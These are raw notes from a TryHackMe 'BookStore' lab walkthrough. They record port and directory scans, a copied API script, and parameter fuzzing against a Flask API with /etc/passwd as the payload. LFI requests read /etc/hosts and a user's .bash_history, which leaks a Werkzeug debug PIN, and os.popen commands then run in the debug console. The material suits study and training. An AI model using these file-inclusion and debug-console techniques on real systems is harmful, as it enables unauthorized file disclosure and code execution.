
<code>

### Service Enumaration  
┌──(duke㉿kali)-[~/Documents/THM_BookStore]
└─$ nmap  -sV -Pn 10.10.189.121

Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-19 03:54 CST
Nmap scan report for 10.10.189.121
Host is up (0.040s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds

### Web Enumaration  

┌──(duke㉿kali)-[~/Documents/THM_BookStore]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.189.121 -x .txt,.php,html
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
[+] Url:                     http://10.10.189.121
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
2024/02/19 03:54:59 Starting gobuster in directory enumeration mode
/images               (Status: 301) [Size: 315] [--> http://10.10.189.121/images/]
/index.html           (Status: 200) [Size: 6452]                                  
/login.html           (Status: 200) [Size: 5325]                                  
/books.html           (Status: 200) [Size: 2940]                                  
/assets               (Status: 301) [Size: 315] [--> http://10.10.189.121/assets/]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.189.121/javascript/]
/LICENSE.txt          (Status: 200) [Size: 17130]                                     
/server-status        (Status: 403) [Size: 278]                                       

### api.js

function getAPIURL() {
var str = window.location.hostname;
str = str + ":5000"
return str;

    }
async function getUsers() {
    var u=getAPIURL();
    let url = 'http://' + u + '/api/v2/resources/books/random4';
    try {
        let res = await fetch(url);
	return await res.json();
    } catch (error) {
        console.log(error);
    }
}

async function renderUsers() {
    let users = await getUsers();
    let html = '';
    users.forEach(user => {
        let htmlSegment = `<div class="user">
	 	        <h2>Title : ${user.title}</h3> <br>
                        <h3>First Sentence : </h3> <br>
			<h4>${user.first_sentence}</h4><br>
                        <h1>Author: ${user.author} </h1> <br> <br>        
                </div>`;

        html += htmlSegment;
   });
   
    let container = document.getElementById("respons");
    container.innerHTML = html;
}
renderUsers();
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.

### API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)
/api/v2/resources/books/random4 (Retrieve 4 random records)
/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)
/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)
/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)
/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)

### parametr API Enumeration

┌──(duke㉿kali)-[~/Documents/THM_BookStore]
└─$ wfuzz -w ../../www/wordlists/fuzz-parameters.txt -c --hc 404 -t 40 http://10.10.194.43:5000/api/v1/resources/books?FUZZ=/etc/passwd
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.194.43:5000/api/v1/resources/books?FUZZ=/etc/passwd
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================


>>> os.popen('id').read()
'uid=1000(sid) gid=1000(sid) groups=1000(sid)\n'
>>> os.popen('pwd').read()
'/home/sid\n'


http://10.10.194.43:5000/api/v1/resources/books?show=/etc/hosts
http://10.10.194.43:5000/api/v1/resources/books?show=/home/sid/.bash_history
cd /home/sid whoami export WERKZEUG_DEBUG_PIN=123-321-135 echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit 


<\code>
